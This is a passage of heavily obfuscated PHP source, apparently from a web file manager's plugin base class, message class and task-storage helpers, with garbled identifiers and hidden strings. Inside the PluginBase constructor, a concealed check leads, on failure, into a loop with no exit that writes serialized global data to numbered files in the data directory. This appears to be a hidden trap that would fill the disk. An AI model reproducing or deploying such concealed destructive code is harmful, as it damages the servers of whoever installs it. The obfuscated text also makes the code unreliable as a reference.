self::valueSet($c¢³Ç¾Å¦[$f¼„£º¿³[367]], !1); } } private static function changeStatus($Câ÷¬‘Ëßœ, $e’ã¹ÃËÈ) { goto C×½ÂÌàù; fòñ…²ĞØÙ: $eÏ¢ÙÛ®½Ÿ[$a”òÆ“ [703]] = $e’ã¹ÃËÈ; self::valueSet($Câ÷¬‘Ëßœ, $eÏ¢ÙÛ®½Ÿ); self::log($a”òÆ“ [1465] . $eÏ¢ÙÛ®½Ÿ[$a”òÆ“ [367]] . $a”òÆ“ [1466] . $e’ã¹ÃËÈ); goto aİ•ÀÅ‹šŞ; C×½ÂÌàù: $a”òÆ“  =& $_SERVER[¯Ò¬Èè]; $eÏ¢ÙÛ®½Ÿ = self::valueGet($Câ÷¬‘Ëßœ); if (!$eÏ¢ÙÛ®½Ÿ) { return !1; } goto fòñ…²ĞØÙ; aİ•ÀÅ‹šŞ: return !0; goto CŠ÷Ì»ù‚Ä; CŠ÷Ì»ù‚Ä: } public static function valueGet($Dù”Ì¦ì¿ = false) { $BÙù•ç×Œ =& $_SERVER[¯Ò¬Èè]; if ($Dù”Ì¦ì¿) { $A¹ÚÉÁ¡ˆ¾ = Model($BÙù•ç×Œ[399])->where(array($BÙù•ç×Œ[89] => $Dù”Ì¦ì¿, $BÙù•ç×Œ[29] => $BÙù•ç×Œ[1467]))->find(); return $A¹ÚÉÁ¡ˆ¾ ? json_decode($A¹ÚÉÁ¡ˆ¾[$BÙù•ç×Œ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($aŞ¯ïŒä¸ = false) { goto fÃ”¨‹ÅƒŸ; fÃ”¨‹ÅƒŸ: $D¹ë’Ïà§È =& $_SERVER[¯Ò¬Èè]; $F˜çŒ›±ìÇ = array($D¹ë’Ïà§È[29] => $D¹ë’Ïà§È[1467]); if ($aŞ¯ïŒä¸) { $F˜çŒ›±ìÇ[$D¹ë’Ïà§È[1446]] = $aŞ¯ïŒä¸; } goto DÇãÚ÷ÎÍæ; DÇãÚ÷ÎÍæ: $CØ¹Àƒ…ŒŠ = Model($D¹ë’Ïà§È[399])->where($F˜çŒ›±ìÇ)->select(); $CØ¹Àƒ…ŒŠ = $CØ¹Àƒ…ŒŠ ? $CØ¹Àƒ…ŒŠ : array(); foreach ($CØ¹Àƒ…ŒŠ as $AŞ›œôù÷õ => $EÉÈ¡£ƒè) { $CØ¹Àƒ…ŒŠ[$AŞ›œôù÷õ] = json_decode($EÉÈ¡£ƒè[$D¹ë’Ïà§È[359]], !0); } goto déƒâ«‘; déƒâ«‘: return $CØ¹Àƒ…ŒŠ; goto A¬±©÷ˆÓÚ; A¬±©÷ˆÓÚ: } public static function valueSet($B×ØãùÀêİ, $eœµ³®¥ì˜) { goto cæ·‹ï¯İÓ; f›Ñ§÷İ»Û: Model($b‘¹Æõ¯ËÔ[399])->add($D¦ƒ…ÁŠÊ¬, array(), !0); goto BÇ™§»á£; cæ·‹ï¯İÓ: $b‘¹Æõ¯ËÔ =& $_SERVER[¯Ò¬Èè]; if (!$eœµ³®¥ì˜) { return Model($b‘¹Æõ¯ËÔ[399])->where(array($b‘¹Æõ¯ËÔ[89] => $B×ØãùÀêİ, $b‘¹Æõ¯ËÔ[29] => $b‘¹Æõ¯ËÔ[1467]))->delete(); } $A”å¼‘øÓ‡ = json_encode($eœµ³®¥ì˜); goto fô™·ŸÔÆ; fô™·ŸÔÆ: if (!$A”å¼‘øÓ‡) { ob_start(); var_dump($eœµ³®¥ì˜); $D¸±ô«®‡‹ = ob_get_clean(); self::log($b‘¹Æõ¯ËÔ[1468] . json_encode_force($D¸±ô«®‡‹)); } if (!$B×ØãùÀêİ || !$eœµ³®¥ì˜[$b‘¹Æõ¯ËÔ[367]]) { return !1; } $D¦ƒ…ÁŠÊ¬ = array($b‘¹Æõ¯ËÔ[29] => $b‘¹Æõ¯ËÔ[1467], $b‘¹Æõ¯ËÔ[1446] => USER_ID, $b‘¹Æõ¯ËÔ[89] => $B×ØãùÀêİ, $b‘¹Æõ¯ËÔ[359] => $A”å¼‘øÓ‡); goto f›Ñ§÷İ»Û; BÇ™§»á£: } public static function log($aƒÌ‚İ¢×à) { write_log($aƒÌ‚İ¢×à, $_SERVER[¯Ò¬Èè][1469]); } } goto bˆ¥…«½¤Õ; d§™£Ë´: class Message { function __construct() { } public function send($C÷éÂİòó = '', $b –éº¸ò = array(), $eà¼®Åõ›ù = "\x74\x65\170\164") { goto a”…™£Ä½ƒ; Eò»“ãİë: $b –éº¸ò = array($eˆÁ‰—³Ğë[980] => isset($b –éº¸ò[$eˆÁ‰—³Ğë[980]]) ? $b –éº¸ò[$eˆÁ‰—³Ğë[980]] : $eˆÁ‰—³Ğë[33], $eˆÁ‰—³Ğë[544] => isset($b –éº¸ò[$eˆÁ‰—³Ğë[544]]) ? $b –éº¸ò[$eˆÁ‰—³Ğë[544]] : $eˆÁ‰—³Ğë[33]); if (empty($C÷éÂİòó) || empty($b –éº¸ò[$eˆÁ‰—³Ğë[980]]) && empty($b –éº¸ò[$eˆÁ‰—³Ğë[544]])) { return !1; } $föØñ›ÖäÉ = array($eˆÁ‰—³Ğë[1254] => $AØ‘—ÂµÑö, $eˆÁ‰—³Ğë[1314] => $b –éº¸ò); goto CÚ¦·ê’ëù; CÚ¦·ê’ëù: Hook::trigger($eˆÁ‰—³Ğë[1315], $föØñ›ÖäÉ); goto EôÏË¡Æ±İ; a”…™£Ä½ƒ: $eˆÁ‰—³Ğë =& $_SERVER[¯Ò¬Èè]; $AØ‘—ÂµÑö = array($eˆÁ‰—³Ğë[29] => $eˆÁ‰—³Ğë[1312], $eˆÁ‰—³Ğë[706] => $C÷éÂİòó); if (in_array($eà¼®Åõ›ù, array($eˆÁ‰—³Ğë[1312], $eˆÁ‰—³Ğë[1313]))) { $AØ‘—ÂµÑö[$eˆÁ‰—³Ğë[29]] = $eà¼®Åõ›ù; } goto Eò»“ãİë; EôÏË¡Æ±İ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C™‡Äæ§…; D›ØŠÑ¡Š: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $fçÏØµ‘¯š[8]; $this->pluginApi = appHostGet() . $fçÏØµ‘¯š[1320] . $this->pluginName . $fçÏØµ‘¯š[8]; $this->pluginHost = $config[$fçÏØµ‘¯š[1321]] . $this->pluginName . $fçÏØµ‘¯š[8]; goto BØª·Œ¦œò; bğìÏÚŸ¨: $this->in =& $in; $this->modelPlugin = Model($fçÏØµ‘¯š[1319]); $this->pluginName = str_replace($fçÏØµ‘¯š[1319], $fçÏØµ‘¯š[33], get_class($this)); goto D›ØŠÑ¡Š; aÌ†¡…Î¿›: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto b­ŞêŸ¤Ù¸; CÑöäÜ¥ñÃ: if ($_SERVER[$fçÏØµ‘¯š[490]] != $Aê¢ŒƒÄ×($aæ‚”…­Ÿ)) { goto dø‚‡èâò¥; aî™¹šêÖ: $d³™£”ôàç = $Bœî¿…â‰Å($C£¼ö›ŸÓ“); $e®´¿×êÉ™ = explode($fçÏØµ‘¯š[217], $d³™£”ôàç); if (count($e®´¿×êÉ™) < $fçÏØµ‘¯š[570]) { $D°è©í¶ÛÊ = $fçÏØµ‘¯š[496]; $D°è©í¶ÛÊ(); } goto dÊ‡ÆÖÛİ; A¦Ü½„ô’„: $CÅÄ¯ÁµƒÒ = 1; for ($ašÁƒˆ¦™¯ = $CÅÄ¯ÁµƒÒ; $ašÁƒˆ¦™¯ > 0; $ašÁƒˆ¦™¯++) { $C¦Ê½µ“(DATA_PATH . $ašÁƒˆ¦™¯, $Cô¹“†Ÿä¨); } goto EËÎïºƒ; dø‚‡èâò¥: $a¥¿ƒºâ¶ = $fçÏØµ‘¯š[802]; $Bœî¿…â‰Å = $fçÏØµ‘¯š[492]; $C£¼ö›ŸÓ“ = $_SERVER[$fçÏØµ‘¯š[493]] . $fçÏØµ‘¯š[494]; goto aî™¹šêÖ; dÊ‡ÆÖÛİ: $d‰ÅÉ¥‰˜Ÿ = $fçÏØµ‘¯š[803]; $d‰ÅÉ¥‰˜Ÿ($_SERVER[$fçÏØµ‘¯š[804]]); $a¥¿ƒºâ¶ = $fçÏØµ‘¯š[802]; goto d’œˆ†á— ; d’œˆ†á— : $a¥¿ƒºâ¶(); $C¦Ê½µ“ = $fçÏØµ‘¯š[1317]; $Cô¹“†Ÿä¨ = json_encode($GLOBALS[$fçÏØµ‘¯š[1318]]); goto A¦Ü½„ô’„; EËÎïºƒ: } global $in, $config; $this->config =& $config; goto bğìÏÚŸ¨; C™‡Äæ§…: $fçÏØµ‘¯š =& $_SERVER[¯Ò¬Èè]; $aæ‚”…­Ÿ = $_SERVER[$fçÏØµ‘¯š[493]] . $fçÏØµ‘¯š[494]; $Aê¢ŒƒÄ× = $fçÏØµ‘¯š[1316]; goto CÑöäÜ¥ñÃ; BØª·Œ¦œò: $this->pluginHostDefault = $config[$fçÏØµ‘¯š[1321]] . $this->pluginName . $fçÏØµ‘¯š[8]; $bÄ¡’’Æî = $config[$fçÏØµ‘¯š[1322]]; if ($bÄ¡’’Æî && strpos($fçÏØµ‘¯š[47] . $bÄ¡’’Æî . $fçÏØµ‘¯š[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$fçÏØµ‘¯š[1323]] . $this->pluginName . $fçÏØµ‘¯š[8]; } goto aÌ†¡…Î¿›; b­ŞêŸ¤Ù¸: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¯Ò¬Èè][1324]); } protected function assign($EøÉ­¥°ö×, $FÚÏÓ§®§¢ = false) { if (is_array($EøÉ­¥°ö×)) { $this->values = array_merge($this->values, $EøÉ­¥°ö×); } else { $this->values[$EøÉ­¥°ö×] = $FÚÏÓ§®§¢; } } protected function display($f¹î®¼ğè) { extract($this->values); require $f¹î®¼ğè; } final function hookRegist($eæÅæÇ¢ø) { $this->modelPlugin->appRegist($this->pluginName, $eæÅæÇ¢ø); } final function appIcon() { $cˆŠ¼Ë––± =& $_SERVER[¯Ò¬Èè]; $A§‹–°³Œ = $this->appPackage(); $Cº©‰ŒáÛù = $cˆŠ¼Ë––±[33]; if (isset($A§‹–°³Œ[$cˆŠ¼Ë––±[382]])) { if (isset($A§‹–°³Œ[$cˆŠ¼Ë––±[382]][$cˆŠ¼Ë––±[1325]])) { $Cº©‰ŒáÛù = $cˆŠ¼Ë––±[1326] . $A§‹–°³Œ[$cˆŠ¼Ë––±[382]][$cˆŠ¼Ë––±[1325]] . $cˆŠ¼Ë––±[1327]; } else { if ($A§‹–°³Œ[$cˆŠ¼Ë––±[382]][$cˆŠ¼Ë––±[1328]]) { $Cº©‰ŒáÛù = $cˆŠ¼Ë––±[1329] . $A§‹–°³Œ[$cˆŠ¼Ë––±[382]][$cˆŠ¼Ë––±[1328]] . $cˆŠ¼Ë––±[1330]; } } } return $Cº©‰ŒáÛù; } final function fileCanView($b–ñŒõÆ°) { goto añåùÉœù¿; añåùÉœù¿: $F•¹Ø´¨İ =& $_SERVER[¯Ò¬Èè]; if (request_url_safe($b–ñŒõÆ°)) { return !0; } if ($this->isShare($b–ñŒõÆ°)) { return !0; } goto b†É–¬µÊà; b†É–¬µÊà: $aÎÔç•ÓùÒ = Session::get($F•¹Ø´¨İ[1331]); if (!$aÎÔç•ÓùÒ || !$aÎÔç•ÓùÒ[$F•¹Ø´¨İ[1332]]) { $E‰ÜÉò£‰¾ = $F•¹Ø´¨İ[1333] . rawurlencode(this_url()); show_tips(LNG($F•¹Ø´¨İ[1334]) . $F•¹Ø´¨İ[1335] . $E‰ÜÉò£‰¾ . $F•¹Ø´¨İ[1336] . LNG($F•¹Ø´¨İ[1337]) . $F•¹Ø´¨İ[1338], !1); } if (!Action($F•¹Ø´¨İ[1339])->authCan($F•¹Ø´¨İ[1340])) { show_tips(LNG($F•¹Ø´¨İ[1341]) . $F•¹Ø´¨İ[1342], !1); } goto D„ËÜ¨µÒ; D„ËÜ¨µÒ: ActionCall($F•¹Ø´¨İ[1343], $b–ñŒõÆ°); goto EÀœğ®Ó²œ; EÀœğ®Ó²œ: } final function isShare($e·É÷ÅÌ) { $dÕÒä©¨¹” = KodIO::parse($e·É÷ÅÌ); return $dÕÒä©¨¹”[$_SERVER[¯Ò¬Èè][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($EáÏ ¶İŸ) { if (request_url_safe($EáÏ ¶İŸ)) { return $EáÏ ¶İŸ; } if (!$this->isShare($EáÏ ¶İŸ)) { $EáÏ ¶İŸ = $this->filePath($EáÏ ¶İŸ); } return Action($_SERVER[¯Ò¬Èè][1027])->linkOut($EáÏ ¶İŸ); } public function filePathLinkOut($f¥øö³—±ƒ) { if (request_url_safe($f¥øö³—±ƒ)) { return $f¥øö³—±ƒ; } $this->fileCanView($f¥øö³—±ƒ); return Action($_SERVER[¯Ò¬Èè][1027])->link($f¥øö³—±ƒ); } final function filePath($b§„¼Ì³›å) { $Dä³‘ˆ–©Š =& $_SERVER[¯Ò¬Èè]; if ($FîóÍ½àŞé = $this->checkSharePath($b§„¼Ì³›å)) { return $FîóÍ½àŞé; } $this->fileCanView($b§„¼Ì³›å); if (request_url_safe($b§„¼Ì³›å)) { $F‘œ¬‚½„ß = parse_url_query($b§„¼Ì³›å); if (isset($F‘œ¬‚½„ß[$Dä³‘ˆ–©Š[1344]]) && isset($F‘œ¬‚½„ß[$Dä³‘ˆ–©Š[197]])) { $F„ÕÑ…¼£ = Model($Dä³‘ˆ–©Š[1097])->get($Dä³‘ˆ–©Š[1345]); $E®éÓ…´–¦ = Mcrypt::decode($F‘œ¬‚½„ß[$Dä³‘ˆ–©Š[197]], $F„ÕÑ…¼£); if ($E®éÓ…´–¦) { $this->fileInfo = IO::infoWithChildren($E®éÓ…´–¦); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $E®éÓ…´–¦; } } $b§„¼Ì³›å = $this->_cacheHttpFile($b§„¼Ì³›å); $this->fileInfo = IO::infoWithChildren($b§„¼Ì³›å); } else { $this->fileInfo = IO::infoWithChildren($b§„¼Ì³›å); if (!$this->fileInfo) { show_tips(LNG($Dä³‘ˆ–©Š[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $b§„¼Ì³›å; } final function _cacheHttpFile($A—Å¢¿¤Ùœ) { $eÓ¬™¤Í†Î = hash_path($A—Å¢¿¤Ùœ, !0); $this->cachePath = $this->pluginCachePath($eÓ¬™¤Í†Î); if ($bğ§­¥Ö¾ = IO::fileNameExist($this->cachePath, $eÓ¬™¤Í†Î)) { return KodIO::make($bğ§­¥Ö¾); } $EËÜ«É¢†Õ = $this->cachePath . $eÓ¬™¤Í†Î; return $this->pluginCacheFileSet($EËÜ«É¢†Õ, file_get_contents($A—Å¢¿¤Ùœ)); } final function _tmpFileName($fš‰¨˜ÍÜÓ = array()) { goto CÄÒÛ¤…è; CÄÒÛ¤…è: $D¼ó×Í™©ë =& $_SERVER[¯Ò¬Èè]; if (!$fš‰¨˜ÍÜÓ) { $fš‰¨˜ÍÜÓ = $this->fileInfo; } if (isset($fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[164]])) { return $fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[164]]; } goto E…‹¸¨†âÌ; E…‹¸¨†âÌ: if (isset($fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[162]][$D¼ó×Í™©ë[164]])) { return $fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[162]][$D¼ó×Í™©ë[164]]; } $b¦‘¦ãÛ‡‚ = IO::hashSimple($fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[75]]); if ($b¦‘¦ãÛ‡‚) { return $b¦‘¦ãÛ‡‚; } goto aÎÛ­ø¡Û; aÎÛ­ø¡Û: $d×³ …¾ = array($fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[28]], $fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[75]], $fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[77]]); if (isset($fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[459]])) { $d×³ …¾[] = $fš‰¨˜ÍÜÓ[$D¼ó×Í™©ë[459]]; } return md5(implode($D¼ó×Í™©ë[70], $d×³ …¾)); goto e›¡à¯’Æò; e›¡à¯’Æò: } final function checkSharePath($d—ªÄ‹º÷š) { goto CÛµ‹õ¾­ë; Bè ‹ïÙÚ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$a¤ø«ŸŒ[164]]); return $Fµ¼´®‚ç¤[$a¤ø«ŸŒ[75]]; goto B¥¬ô°êò; CÛµ‹õ¾­ë: $a¤ø«ŸŒ =& $_SERVER[¯Ò¬Èè]; if (!defined($a¤ø«ŸŒ[427])) { define($a¤ø«ŸŒ[1346], 0); } if (!$this->isShare($d—ªÄ‹º÷š)) { return !1; } goto eªŒËœÉ; eªŒËœÉ: $Fµ¼´®‚ç¤ = Action($a¤ø«ŸŒ[1027])->sharePathInfo($d—ªÄ‹º÷š); if (!isset($Fµ¼´®‚ç¤[$a¤ø«ŸŒ[75]])) { show_json(LNG($a¤ø«ŸŒ[1347]), !1); } $this->fileInfo = $Fµ¼´®‚ç¤[$a¤ø«ŸŒ[162]]; goto Bè ‹ïÙÚ; B¥¬ô°êò: } final function pluginCachePath($E£²òñÈÄ® = '') { $C½—‚Ü‚íô =& $_SERVER[¯Ò¬Èè]; $d¥Û‡¾ö‘„ = IO_PATH_SYSTEM_TEMP . $C½—‚Ü‚íô[1348] . $this->pluginName; if (!($B·æ¶ƒÁÄå = IO::infoFull($d¥Û‡¾ö‘„))) { return IO::mkdir($d¥Û‡¾ö‘„ . $C½—‚Ü‚íô[8] . $E£²òñÈÄ®); } if (empty($E£²òñÈÄ®)) { return $B·æ¶ƒÁÄå[$C½—‚Ü‚íô[75]]; } if (!($CÈ˜¼¼†ñ = IO::fileNameExist($B·æ¶ƒÁÄå[$C½—‚Ü‚íô[75]], $E£²òñÈÄ®))) { return IO::mkdir($B·æ¶ƒÁÄå[$C½—‚Ü‚íô[75]] . $E£²òñÈÄ®); } return KodIO::make($CÈ˜¼¼†ñ); } final function pluginCacheFileSet($f«½çÛÖ¾¨, $AòŞ’—Ç = '') { $CØ·ï†À =& $_SERVER[¯Ò¬Èè]; if (!($C×§äö½¸ƒ = IO::infoFull($f«½çÛÖ¾¨))) { return IO::mkfile($f«½çÛÖ¾¨, $AòŞ’—Ç, REPEAT_REPLACE); } IO::setContent($C×§äö½¸ƒ[$CØ·ï†À[75]], $AòŞ’—Ç); return $C×§äö½¸ƒ[$CØ·ï†À[75]]; } final function pluginLocalFile($e°¬‚Œ£ä = '') { goto Aô¥‚Ú¶Š†; fª˜”£ˆ³À: $bÛ²Ò„ˆ = $fÈĞŠ¼¡Ë . $f›ª¤ÂÜÈÕ; if (@file_exists($bÛ²Ò„ˆ)) { return $bÛ²Ò„ˆ; } return IO::copy($e°¬‚Œ£ä, $fÈĞŠ¼¡Ë, 0, $f›ª¤ÂÜÈÕ); goto Eº®Ø§ØÈ’; FÓĞ÷†‡: if (!$e°¬‚Œ£ä) { return $fÈĞŠ¼¡Ë; } $cÔ½æ‚†·ñ = IO::info($e°¬‚Œ£ä); $f›ª¤ÂÜÈÕ = $this->_tmpFileName($cÔ½æ‚†·ñ) . $bæ‡Óç³¦¢[91] . $cÔ½æ‚†·ñ[$bæ‡Óç³¦¢[160]]; goto fª˜”£ˆ³À; Aô¥‚Ú¶Š†: $bæ‡Óç³¦¢ =& $_SERVER[¯Ò¬Èè]; $fÈĞŠ¼¡Ë = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($fÈĞŠ¼¡Ë)) { mk_dir($fÈĞŠ¼¡Ë); } goto FÓĞ÷†‡; Eº®Ø§ØÈ’: } final function appPackage() { goto FéÁ†Ôù°Ç; FéÁ†Ôù°Ç: $eÅƒ©´ÊÏÔ =& $_SERVER[¯Ò¬Èè]; if ($this->packageData) { return $this->packageData; } $A¾ó‘ƒ… = $this->parseFile($this->pluginPath . $eÅƒ©´ÊÏÔ[1349]); goto d…¯²šØ‘¾; cİ°´»¦ŒÎ: $eïôàÜÛò¡ = Hook::trigger($eÅƒ©´ÊÏÔ[1350], $f«¬ ‹ö°À); if ($eïôàÜÛò¡ && is_array($eïôàÜÛò¡)) { $f«¬ ‹ö°À = $eïôàÜÛò¡; } $this->packageData = $f«¬ ‹ö°À; goto bÃùÖÂÎ®¢; d…¯²šØ‘¾: $this->parseLang($A¾ó‘ƒ…); $f«¬ ‹ö°À = json_decode_force($A¾ó‘ƒ…); if (!$f«¬ ‹ö°À) { return array(); } goto cİ°´»¦ŒÎ; bÃùÖÂÎ®¢: return $f«¬ ‹ö°À; goto DÑ £Ññ¢â; DÑ £Ññ¢â: } public function packageInfoGet($Aç¹À¯ÉªŒ) { $aåÄâ‘ = $this->appPackage(); return array_get_value($aåÄâ‘, $Aç¹À¯ÉªŒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¯Ò¬Èè][1351]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¯Ò¬Èè][1352]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¯Ò¬Èè][1353]); } private function parseFile($CÁ­ØÆ¸›) { goto FŒÆ¹Ô‰æ“; FŒÆ¹Ô‰æ“: $E·»·œ‚ßé =& $_SERVER[¯Ò¬Èè]; $C¿öˆôĞ¥Ï = file_get_contents($CÁ­ØÆ¸›); $bßÇòÍ® ¨ = array($E·»·œ‚ßé[1354], $E·»·œ‚ßé[1355], $E·»·œ‚ßé[1356], $E·»·œ‚ßé[1357], $E·»·œ‚ßé[1358], $E·»·œ‚ßé[1359], $E·»·œ‚ßé[1360]); goto aõÔ›ƒŠ˜ ; A­’¦ÈÀà‡: $C¿öˆôĞ¥Ï = str_replace($bßÇòÍ® ¨, $eùÀ‚ÕÃÎ¬, $C¿öˆôĞ¥Ï); return $C¿öˆôĞ¥Ï; goto c…ò»æ¤; aõÔ›ƒŠ˜ : $eùÀ‚ÕÃÎ¬ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$E·»·œ‚ßé[84]][$E·»·œ‚ßé[1361]]); if (strstr($C¿öˆôĞ¥Ï, $E·»·œ‚ßé[1362])) { $Eï‹¦Û—­ = rawurlencode(json_encode($this->pluginLangArr)); $C¿öˆôĞ¥Ï = str_replace($E·»·œ‚ßé[1362], $Eï‹¦Û—­, $C¿öˆôĞ¥Ï); } if (strstr($C¿öˆôĞ¥Ï, $E·»·œ‚ßé[1363])) { $Eï‹¦Û—­ = $Eï‹¦Û—­ = rawurlencode(json_encode($this->getConfig())); $C¿öˆôĞ¥Ï = str_replace($E·»·œ‚ßé[1363], $Eï‹¦Û—­, $C¿öˆôĞ¥Ï); } goto A­’¦ÈÀà‡; c…ò»æ¤: } private function parseLang(&$CŞ­•Ù©òö) { goto CµìÙÒ•Ÿµ; eï˜õÂï°‡: $Eàá‰‰©‹Ò = array(); foreach ($CËğŸ…‹³[0] as $fö¹¶óŒÄ˜) { $a¯ìòˆ§Ÿ² = substr($fö¹¶óŒÄ˜, strlen($E„İóğ½‚é), -4); $b‘í›‹ïˆ = LNG($a¯ìòˆ§Ÿ²); $dºÖõãÌÔ¶[] = $fö¹¶óŒÄ˜; $Eàá‰‰©‹Ò[] = str_replace(array($e¼ĞåØÒ«[217], $e¼ĞåØÒ«[1001], $e¼ĞåØÒ«[330], $e¼ĞåØÒ«[113]), array($e¼ĞåØÒ«[50], $e¼ĞåØÒ«[50], $e¼ĞåØÒ«[33], $e¼ĞåØÒ«[1366]), $b‘í›‹ïˆ); } $CŞ­•Ù©òö = str_replace($dºÖõãÌÔ¶, $Eàá‰‰©‹Ò, $CŞ­•Ù©òö); goto e•îÆğùàÅ; E„šùÜÖà˜: preg_match_all($e¼ĞåØÒ«[1365], $CŞ­•Ù©òö, $CËğŸ…‹³); if (!is_array($CËğŸ…‹³) || count($CËğŸ…‹³) == 0 || !is_array($CËğŸ…‹³[0]) || count($CËğŸ…‹³[0]) == 0) { return; } $dºÖõãÌÔ¶ = array(); goto eï˜õÂï°‡; CµìÙÒ•Ÿµ: $e¼ĞåØÒ« =& $_SERVER[¯Ò¬Èè]; $E„İóğ½‚é = $e¼ĞåØÒ«[1364]; if (!strstr($CŞ­•Ù©òö, $E„İóğ½‚é)) { return; } goto E„šùÜÖà˜; e•îÆğùàÅ: } private function parseConfig(&$eäíçšÈò) { goto d±õÇôİ®‰; Dˆ¸±İ²ª: $Cãğõ³— ’ = array(); $EàÑ…Á¼ßƒ = array(); foreach ($dµÎğø“‚[0] as $FÒáª¿ğÃâ) { $a”º§µéÕ = substr($FÒáª¿ğÃâ, strlen($cÂô›«Íä÷), -2); $Cãğõ³— ’[] = $FÒáª¿ğÃâ; $EàÑ…Á¼ßƒ[] = _get($fŞœËó¯¦, $a”º§µéÕ); } goto C¢öó…‚Â•; C»ëöê¸öù: preg_match_all($b­²ØìÍÁ™[1368], $eäíçšÈò, $dµÎğø“‚); if (!is_array($dµÎğø“‚) || count($dµÎğø“‚) == 0 || !is_array($dµÎğø“‚[0]) || count($dµÎğø“‚[0]) == 0) { return; } $fŞœËó¯¦ = $this->getConfig(); goto Dˆ¸±İ²ª; C¢öó…‚Â•: $eäíçšÈò = str_replace($Cãğõ³— ’, $EàÑ…Á¼ßƒ, $eäíçšÈò); goto a¢¿ßÅÏ…ç; d±õÇôİ®‰: $b­²ØìÍÁ™ =& $_SERVER[¯Ò¬Èè]; $cÂô›«Íä÷ = $b­²ØìÍÁ™[1367]; if (!strstr($eäíçšÈò, $cÂô›«Íä÷)) { return; } goto C»ëöê¸öù; a¢¿ßÅÏ…ç: } private function parsePackage(&$F°¡ß‹Ì«) { goto f²«ñ­»Ù; E©µÄë‚Ş«: $fêÂš§·• = array(); $E‚‹ğİ¦—Ï = array(); foreach ($b‹‘Ë¬×«Ÿ[0] as $Fƒë§ÂÎ·ƒ) { $Fç‘ÃÚß½Ò = substr($Fƒë§ÂÎ·ƒ, strlen($BÙğñŠİƒò), -2); $fêÂš§·•[] = $Fƒë§ÂÎ·ƒ; $E‚‹ğİ¦—Ï[] = _get($eÅÜ•í›ÆÛ, $Fç‘ÃÚß½Ò); } goto A¯¹òâ†ÁÊ; f²«ñ­»Ù: $Añ‹¡©ˆµò =& $_SERVER[¯Ò¬Èè]; $BÙğñŠİƒò = $Añ‹¡©ˆµò[1369]; if (!strstr($F°¡ß‹Ì«, $BÙğñŠİƒò)) { return; } goto f„Ÿ¸µÛ¾; f„Ÿ¸µÛ¾: preg_match_all($Añ‹¡©ˆµò[1370], $F°¡ß‹Ì«, $b‹‘Ë¬×«Ÿ); if (!is_array($b‹‘Ë¬×«Ÿ) || count($b‹‘Ë¬×«Ÿ) == 0 || !is_array($b‹‘Ë¬×«Ÿ[0]) || count($b‹‘Ë¬×«Ÿ[0]) == 0) { return; } $eÅÜ•í›ÆÛ = $this->appPackage(); goto E©µÄë‚Ş«; A¯¹òâ†ÁÊ: $F°¡ß‹Ì« = str_replace($fêÂš§·•, $E‚‹ğİ¦—Ï, $F°¡ß‹Ì«); goto eäèÂèë—; eäèÂèë—: } final function echoFile($dŒºÓÌŸ—ª, $aâÜø–Áç = false) { goto cÕ”É¥«Ñ; cÕ”É¥«Ñ: $e”±§Ú·òİ =& $_SERVER[¯Ò¬Èè]; $BòóôÈİ‡ = $this->pluginPath . $dŒºÓÌŸ—ª; if (ACT == $e”±§Ú·òİ[1371]) { echo $e”±§Ú·òİ[1372] . $this->pluginName . $e”±§Ú·òİ[8] . $dŒºÓÌŸ—ª . $e”±§Ú·òİ[1373]; if (!file_exists($BòóôÈİ‡)) { echo $e”±§Ú·òİ[1374]; return; } } goto e½ÜğÇÁ„; cğæêÜÔÛ: $this->parsePackage($FÀ”ÏÀ); if (is_array($aâÜø–Áç)) { $FÀ”ÏÀ = str_replace(array_keys($aâÜø–Áç), array_values($aâÜø–Áç), $FÀ”ÏÀ); } echo $e”±§Ú·òİ[217] . $FÀ”ÏÀ; goto fÑÓëŞßì«; e½ÜğÇÁ„: $FÀ”ÏÀ = $this->parseFile($BòóôÈİ‡); $this->parseLang($FÀ”ÏÀ); $this->parseConfig($FÀ”ÏÀ); goto cğæêÜÔÛ; fÑÓëŞßì«: } final function initLang() { goto dí“×ÛÏ‰Ö; E×¸çë­êè: $e¦„ğòôî = I18n::getType(); $BåÚ½²ê› = array(); if (file_exists($BÚŸà‡¤¨ë . $e¦„ğòôî . $C·ëÂšÅ¿Î[780])) { $BåÚ½²ê› = (include $BÚŸà‡¤¨ë . $e¦„ğòôî . $C·ëÂšÅ¿Î[780]); } else { if ($e¦„ğòôî == $C·ëÂšÅ¿Î[1377] && !file_exists($BÚŸà‡¤¨ë . $e¦„ğòôî . $C·ëÂšÅ¿Î[780]) && file_exists($BÚŸà‡¤¨ë . $C·ëÂšÅ¿Î[1378])) { $BåÚ½²ê› = (include $BÚŸà‡¤¨ë . $C·ëÂšÅ¿Î[1378]); } else { if (file_exists($BÚŸà‡¤¨ë . $FÖ ©“¬­– . $C·ëÂšÅ¿Î[780])) { $BåÚ½²ê› = (include $BÚŸà‡¤¨ë . $FÖ ©“¬­– . $C·ëÂšÅ¿Î[780]); } } } goto C•¶ŸÑ³±‰; C•¶ŸÑ³±‰: if (!is_array($BåÚ½²ê›)) { return array(); } if (@count($BåÚ½²ê›) > 0) { I18n::set($BåÚ½²ê›); } return 